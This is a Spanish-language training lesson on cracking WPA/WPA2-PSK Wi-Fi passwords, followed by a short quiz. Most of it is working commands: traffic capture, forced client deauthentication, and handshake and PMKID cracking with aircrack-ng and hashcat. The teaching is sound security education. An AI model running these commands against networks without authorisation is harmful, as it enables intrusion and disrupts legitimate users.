Las redes WPA/WPA2 fueron diseñadas para superar las debilidades del estándar WEP. Sin embargo, se han desarrollado técnicas que permiten descubrir la contraseña de acceso a estas redes.

## Usos
1. Redes domésticas o de invitados con cifrado.
2. Dispositivos confiables en el segmento (Impresoras, IoT, dispositivos VoIP).
3. Hotspots pequeños para grupos específicos (VIP, Administradores).

## Problemas Asociados
1. Todos los usuarios comparten la misma contraseña, lo que genera problemas de seguridad.
2. No hay distinción o autenticación individual de usuarios.
3. Redes críticas pueden usar este estándar, aumentando el riesgo.
4. Contraseñas débiles son vulnerables a ataques de fuerza bruta.

## Tipos de Ataque
### Con Clientes Conectados (Cracking del 4-way Handshake)
#### Monitorizar y capturar tráfico

```bash
	$ airodump-ng wlan0 -c 11 --essid 'nombre_red' --bssid AA:BB:CC:DD:EE:FF -w captura
```

#### Forzar deautenticación para capturar el 4-way handshake
```bash
	$ aireplay-ng -0 0 wlan0 -e 'nombre_red' --ignore-negative-one -a AA:BB:CC:DD:EE:FF
```

#### Crackear la contraseña con un diccionario
```bash
	$ aircrack-ng -b AA:BB:CC:DD:EE:FF -w diccionario-contraseñas.txt captura.cap
```

#### Usar herramientas avanzadas como hashcat
##### Exportar el handshake
```bash
     $ aircrack-ng captura.cap -j handshake.hccapx
```
##### Crackear con hashcat (máscara y diccionario)
```bash
     $ hashcat -m 2500 -a3 handshake.hccapx -1 "_-.$?!" -2 ?l?u?d?1 ?u?l?l?l?l?l?2?2
     $ hashcat -m 2500 -a0 handshake.hccapx diccionario_passwords.txt -r reglas
```

### Sin Clientes Conectados (Cracking del PMKID)
#### Capturar el PMKID (RSN IE)

```bash
	$ airodump-ng wlan0 -c 11 --essid 'nombre_red' --bssid AA:BB:CC:DD:EE:FF -w captura
```

#### Exportar el PMKID con aircrack-ng

```bash
	$ aircrack-ng captura.cap -j pmkid.hccapx
```

#### Crackear el PMKID con hashcat
- Máscara:

```bash
	$ hashcat -m 16800 -a3 pmkid.hccapx -1 "_-.$?!" -2 ?l?u?d?1 ?u?l?l?l?l?l?2?2
```

- Diccionario:

```bash
	$ hashcat -m 16800 -a0 pmkid.hccapx diccionario_passwords.txt -r reglas
```
## Para Saber Más
Consulta este [video en YouTube](https://www.youtube.com/watch?v=sl6hMBe2M7k) sobre ataques WPA2-PSK basados en captura y cracking del 4-way-handshake.

> **Nota:** El uso de contraseñas robustas puede mitigar los riesgos, ya que los procesos de cracking son lentos.

## **Autoevaluación**

- **Los ataques más comunes sobre las redes WPA/WPA2-PSK con clientes se basan en:**
	- Realizar un ataque de fuerza bruta probando diferentes contraseñas contra el Punto de Acceso.
		- Incorrecto

	- Capturar la autenticación del 4-way-handshake de un cliente legítimo en la red y realizar un proceso offline de cracking.
		- Correcto

	- Buscar contraseñas por defecto de acceso a la red.
		- Incorrecto
